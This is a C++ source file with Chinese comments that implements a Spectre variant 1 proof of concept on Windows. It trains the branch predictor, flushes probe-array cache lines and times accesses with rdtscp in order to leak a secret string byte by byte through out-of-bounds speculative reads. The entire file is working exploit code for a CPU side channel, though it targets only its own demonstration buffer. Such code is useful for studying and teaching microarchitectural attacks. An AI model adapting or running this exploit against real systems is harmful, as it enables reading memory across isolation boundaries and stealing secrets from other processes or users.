#include <iostream>
#include <stdlib.h>
#include <stdint.h>
#include <intrin.h> // 用于 rdtsc, rdtscp, clflush
#include <algorithm> // 用于 max_element

#include <windows.h>

#pragma optimize("gt", off)

#define RETRY_LIMIT 8192
#define CACHE_HIT_THRESHOLD 48
#define TRAINING_ITERATIONS 26
#define FLUSH_DELAY_CYCLES 128

// 定义全局变量和数组
unsigned int index_array_size = 16;
uint8_t index_array[16] = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };
uint8_t probe_array[256 * 512];
uint8_t dummy_variable = 0; // 用于防止编译器优化。做一些无效的逻辑与。
char secret_message[] = "This is the top secret.";

// 分支预测上可以越界访问的函数，但实际上不会越界访问。
inline void speculative_execution_function(size_t index) {
    if (index < index_array_size) {
        dummy_variable &= probe_array[index_array[index] * 512];
    }
}

// 读取内存字节的函数
void extractMemoryByte(size_t target_index, uint8_t* extracted_value, int* access_score) {
    static int result_scores[256]; // 存储结果
	unsigned int junk_data = 0; // 用于存储无用数据
    int mixed_index;
	int* max_score_ptr = nullptr;
    volatile size_t training_index, accessed_index;
    volatile uint64_t start_time, elapsed_time;
    volatile uint8_t* memory_address;

    // 初始化结果数组
    std::fill(result_scores, result_scores + 256, 0);

    // 尝试读取多次
    for (int attempts = RETRY_LIMIT; attempts > 0; attempts--) {
        // 清除 probe_array 的缓存
        for (int i = 0; i < 256; i++) {
            _mm_clflush(&probe_array[i * 512]);
        }

        // 训练（分支预测器）阶段的 x 值
        training_index = attempts % index_array_size;

        // 训练受害者函数
        for (int j = TRAINING_ITERATIONS; j >= 0; j--) {
            _mm_clflush(&index_array_size); // 清除 index_array 的缓存
			// 确保缓存清除
            for (volatile int z = 0; z < FLUSH_DELAY_CYCLES; z++) {
				asm("nop");
			}

            // 干扰分支预测的无用逻辑
            accessed_index = ((j % 6) - 1) & ~0xFFFF;
			// 到这里x会是0或者0xFFFFFFFFFFFFF800
            accessed_index = (accessed_index | (accessed_index >> 16));
			// 到这里x会是0或者0xFFFFFFFFFFFFFFFF
            accessed_index = training_index ^ (accessed_index & (target_index ^ training_index));
			// 到这里malicious_x会是0或者training_x
            speculative_execution_function(accessed_index);
        }

        // 测试每个 probe_array 地址的访问时间
        for (int i = 0; i < 256; i++) {
            mixed_index = ((i * 167) + 13) & 255;
            memory_address = &probe_array[mixed_index * 512];

            // 记录访问时间
            start_time = __rdtscp(&junk_data);
            junk_data = *memory_address;
            elapsed_time = __rdtscp(&junk_data) - start_time;

            // 如果访问时间小于阈值，则记录结果
            if ((int)elapsed_time <= CACHE_HIT_THRESHOLD && mixed_index != index_array[attempts % index_array_size]) {
                result_scores[mixed_index]++;
            }
        }

        max_score_ptr = std::max_element(result_scores, result_scores + 256);
        // 如果结果足够明显，则退出
        if (*max_score_ptr >= RETRY_LIMIT / 2) {
            break;
        }
    }

    // 将结果存储到 extracted_value 和 access_score 中
    *extracted_value = (uint8_t)(max_score_ptr - result_scores);
    *access_score = *max_score_ptr;
}

int main() {
	// 要读取的字节数
	int bytes_to_read = sizeof(secret_message);
	// 没什么用，但根据Windows API来说需要这个
	unsigned long old_protection = 0;
    // 分配具有执行、读取和写入权限的内存
    void* secret_memory_address = VirtualAlloc(0, bytes_to_read, MEM_COMMIT, PAGE_READWRITE);
    if (secret_memory_address == NULL) {
        std::cerr << "Failed to allocate memory." << std::endl;
        return -1;
    }
	// 复制 secret_message
	memcpy(secret_memory_address, secret_message, bytes_to_read);
	// PAGE_NOACCESS可能会导致部分CPU上攻击失效
	if (!VirtualProtect(secret_memory_address, bytes_to_read, PAGE_READONLY, &old_protection)) {
        std::cerr << "Failed to set memory protection." << std::endl;
        return -1;
	}

    size_t target_index = (size_t)((char*)secret_memory_address - (char*)index_array);

    int score; // 存储分数
    uint8_t value; // 存储值

    // 初始化 probe_array
    std::fill(probe_array, probe_array + sizeof(probe_array), 1);

    // 在不使用内存读的情况下读取内存
    while (--bytes_to_read >= 0) {
        extractMemoryByte(target_index, &value, &score);
        std::cout << "'" << (char)(value > 31 && value < 127 ? value : '?') << "' score=" << std::dec << score << "\n";

		// 下一次越界访问的索引
		target_index++;
    }
    return 0;
}